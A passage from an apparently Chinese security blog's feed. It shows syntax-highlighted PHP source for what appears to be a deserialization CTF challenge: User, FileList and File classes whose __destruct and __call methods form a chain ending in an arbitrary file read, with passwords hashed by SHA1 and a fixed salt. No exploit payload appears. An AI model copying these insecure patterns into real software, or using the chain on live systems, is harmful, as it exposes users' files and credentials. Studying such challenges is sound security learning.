#CE9178">;"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">$stmt</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #DCDCAA">bind_param</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"s"</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">$username</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">$stmt</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #DCDCAA">execute</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">$stmt</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #DCDCAA">store_result</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">$count</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">$stmt</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">num_rows</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">$count</span><span style="color: #D4D4D4"> === </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">false</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        }</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">true</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">add_user</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">$username</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">$password</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #DCDCAA">user_exist</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">$username</span><span style="color: #D4D4D4">)) {</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">false</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        }</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">$password</span><span style="color: #D4D4D4"> = </span><span style="color: #DCDCAA">sha1</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">$password</span><span style="color: #D4D4D4"> </span><span style="color: #D4D4D4">.</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"SiAchGHmFx"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">$stmt</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">db</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #DCDCAA">prepare</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"</span><span style="color: #569CD6">INSERT INTO</span><span style="color: #CE9178"> `users` (`id`, `username`, `password`) </span><span style="color: #569CD6">VALUES</span><span style="color: #CE9178"> (</span><span style="color: #569CD6">NULL</span><span style="color: #CE9178">, ?, ?);"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">$stmt</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #DCDCAA">bind_param</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"ss"</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">$username</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">$password</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">$stmt</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #DCDCAA">execute</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">true</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">verify_user</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">$username</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">$password</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (!</span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #DCDCAA">user_exist</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">$username</span><span style="color: #D4D4D4">)) {</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">false</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        }</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">$password</span><span style="color: #D4D4D4"> = </span><span style="color: #DCDCAA">sha1</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">$password</span><span style="color: #D4D4D4"> </span><span style="color: #D4D4D4">.</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"SiAchGHmFx"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">$stmt</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">db</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #DCDCAA">prepare</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"</span><span style="color: #569CD6">SELECT</span><span style="color: #CE9178"> `password` </span><span style="color: #569CD6">FROM</span><span style="color: #CE9178"> `users` </span><span style="color: #569CD6">WHERE</span><span style="color: #CE9178"> `username` </span><span style="color: #D4D4D4">=</span><span style="color: #CE9178"> ?;"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">$stmt</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #DCDCAA">bind_param</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"s"</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">$username</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">$stmt</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #DCDCAA">execute</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">$stmt</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #DCDCAA">bind_result</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">$expect</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">$stmt</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #DCDCAA">fetch</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #DCDCAA">isset</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">$expect</span><span style="color: #D4D4D4">) &amp;&amp; </span><span style="color: #9CDCFE">$expect</span><span style="color: #D4D4D4"> === </span><span style="color: #9CDCFE">$password</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">true</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        }</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">false</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">__destruct</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">db</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #DCDCAA">close</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #569CD6">class</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">FileList</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">private</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$files</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">private</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$results</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">private</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$funcs</span><span style="color: #D4D4D4">;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">__construct</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">$path</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">files</span><span style="color: #D4D4D4"> = </span><span style="color: #DCDCAA">array</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">results</span><span style="color: #D4D4D4"> = </span><span style="color: #DCDCAA">array</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">funcs</span><span style="color: #D4D4D4"> = </span><span style="color: #DCDCAA">array</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">$filenames</span><span style="color: #D4D4D4"> = </span><span style="color: #DCDCAA">scandir</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">$path</span><span style="color: #D4D4D4">);</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">$key</span><span style="color: #D4D4D4"> = </span><span style="color: #DCDCAA">array_search</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"."</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">$filenames</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #DCDCAA">unset</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">$filenames</span><span style="color: #D4D4D4">[</span><span style="color: #9CDCFE">$key</span><span style="color: #D4D4D4">]);</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">$key</span><span style="color: #D4D4D4"> = </span><span style="color: #DCDCAA">array_search</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">".."</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">$filenames</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #DCDCAA">unset</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">$filenames</span><span style="color: #D4D4D4">[</span><span style="color: #9CDCFE">$key</span><span style="color: #D4D4D4">]);</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #C586C0">foreach</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">$filenames</span><span style="color: #D4D4D4"> as </span><span style="color: #9CDCFE">$filename</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #9CDCFE">$file</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">new</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">File</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #9CDCFE">$file</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #DCDCAA">open</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">$path</span><span style="color: #D4D4D4"> </span><span style="color: #D4D4D4">.</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$filename</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #DCDCAA">array_push</span><span style="color: #D4D4D4">(</span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">files</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">$file</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">results</span><span style="color: #D4D4D4">[</span><span style="color: #9CDCFE">$file</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #DCDCAA">name</span><span style="color: #D4D4D4">()] = </span><span style="color: #DCDCAA">array</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #D4D4D4">        }</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">__call</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">$func</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">$args</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #DCDCAA">array_push</span><span style="color: #D4D4D4">(</span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">funcs</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">$func</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #C586C0">foreach</span><span style="color: #D4D4D4"> (</span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">files</span><span style="color: #D4D4D4"> as </span><span style="color: #9CDCFE">$file</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">results</span><span style="color: #D4D4D4">[</span><span style="color: #9CDCFE">$file</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #DCDCAA">name</span><span style="color: #D4D4D4">()][</span><span style="color: #9CDCFE">$func</span><span style="color: #D4D4D4">] = </span><span style="color: #9CDCFE">$file</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">$func</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #D4D4D4">        }</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">__destruct</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">$table</span><span style="color: #D4D4D4"> = </span><span style="color: #CE9178">'&lt;div id="container" class="container"&gt;&lt;div class="table-responsive"&gt;&lt;table id="table" class="table table-bordered table-hover sm-font"&gt;'</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">$table</span><span style="color: #D4D4D4"> </span><span style="color: #D4D4D4">.=</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">'&lt;thead&gt;&lt;tr&gt;'</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #C586C0">foreach</span><span style="color: #D4D4D4"> (</span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">funcs</span><span style="color: #D4D4D4"> as </span><span style="color: #9CDCFE">$func</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #9CDCFE">$table</span><span style="color: #D4D4D4"> </span><span style="color: #D4D4D4">.=</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">'&lt;th scope="col" class="text-center"&gt;'</span><span style="color: #D4D4D4"> </span><span style="color: #D4D4D4">.</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">htmlentities</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">$func</span><span style="color: #D4D4D4">) </span><span style="color: #D4D4D4">.</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">'&lt;/th&gt;'</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        }</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">$table</span><span style="color: #D4D4D4"> </span><span style="color: #D4D4D4">.=</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">'&lt;th scope="col" class="text-center"&gt;Opt&lt;/th&gt;'</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">$table</span><span style="color: #D4D4D4"> </span><span style="color: #D4D4D4">.=</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">'&lt;/thead&gt;&lt;tbody&gt;'</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #C586C0">foreach</span><span style="color: #D4D4D4"> (</span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">results</span><span style="color: #D4D4D4"> as </span><span style="color: #9CDCFE">$filename</span><span style="color: #D4D4D4"> =&gt; </span><span style="color: #9CDCFE">$result</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #9CDCFE">$table</span><span style="color: #D4D4D4"> </span><span style="color: #D4D4D4">.=</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">'&lt;tr&gt;'</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #C586C0">foreach</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">$result</span><span style="color: #D4D4D4"> as </span><span style="color: #9CDCFE">$func</span><span style="color: #D4D4D4"> =&gt; </span><span style="color: #9CDCFE">$value</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">                </span><span style="color: #9CDCFE">$table</span><span style="color: #D4D4D4"> </span><span style="color: #D4D4D4">.=</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">'&lt;td class="text-center"&gt;'</span><span style="color: #D4D4D4"> </span><span style="color: #D4D4D4">.</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">htmlentities</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">$value</span><span style="color: #D4D4D4">) </span><span style="color: #D4D4D4">.</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">'&lt;/td&gt;'</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">            }</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #9CDCFE">$table</span><span style="color: #D4D4D4"> </span><span style="color: #D4D4D4">.=</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">'&lt;td class="text-center" filename="'</span><span style="color: #D4D4D4"> </span><span style="color: #D4D4D4">.</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">htmlentities</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">$filename</span><span style="color: #D4D4D4">) </span><span style="color: #D4D4D4">.</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">'"&gt;&lt;a href="#" class="download"&gt;下载&lt;/a&gt; / &lt;a href="#" class="delete"&gt;删除&lt;/a&gt;&lt;/td&gt;'</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #9CDCFE">$table</span><span style="color: #D4D4D4"> </span><span style="color: #D4D4D4">.=</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">'&lt;/tr&gt;'</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        }</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #DCDCAA">echo</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$table</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #569CD6">class</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">File</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$filename</span><span style="color: #D4D4D4">;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">open</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">$filename</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">filename</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">$filename</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #DCDCAA">file_exists</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">$filename</span><span style="color: #D4D4D4">) &amp;&amp; !</span><span style="color: #DCDCAA">is_dir</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">$filename</span><span style="color: #D4D4D4">)) {</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">true</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        } </span><span style="color: #C586C0">else</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">false</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        }</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">name</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">basename</span><span style="color: #D4D4D4">(</span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">filename</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">size</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">$size</span><span style="color: #D4D4D4"> = </span><span style="color: #DCDCAA">filesize</span><span style="color: #D4D4D4">(</span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">filename</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">$units</span><span style="color: #D4D4D4"> = </span><span style="color: #DCDCAA">array</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">' B'</span><span style="color: #D4D4D4">, </span><span style="color: #CE9178">' KB'</span><span style="color: #D4D4D4">, </span><span style="color: #CE9178">' MB'</span><span style="color: #D4D4D4">, </span><span style="color: #CE9178">' GB'</span><span style="color: #D4D4D4">, </span><span style="color: #CE9178">' TB'</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #C586C0">for</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">$i</span><span style="color: #D4D4D4"> = </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">; </span><span style="color: #9CDCFE">$size</span><span style="color: #D4D4D4"> &gt;= </span><span style="color: #B5CEA8">1024</span><span style="color: #D4D4D4"> &amp;&amp; </span><span style="color: #9CDCFE">$i</span><span style="color: #D4D4D4"> &lt; </span><span style="color: #B5CEA8">4</span><span style="color: #D4D4D4">; </span><span style="color: #9CDCFE">$i</span><span style="color: #D4D4D4">++) </span><span style="color: #9CDCFE">$size</span><span style="color: #D4D4D4"> /= </span><span style="color: #B5CEA8">1024</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">round</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">$size</span><span style="color: #D4D4D4">, </span><span style="color: #B5CEA8">2</span><span style="color: #D4D4D4">)</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">$units</span><span style="color: #D4D4D4">[</span><span style="color: #9CDCFE">$i</span><span style="color: #D4D4D4">];</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">detele</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #DCDCAA">unlink</span><span style="color: #D4D4D4">(</span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">filename</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">close</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">file_get_contents</span><span style="color: #D4D4D4">(</span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">filename</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #D4D4D4">?&gt;</span></span></code></pre></div></div></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅略了解团队协作必须的 Git 的使用</title>
      <link href="/posts/79216.html"/>
      <url>/posts/79216.html</url>
      
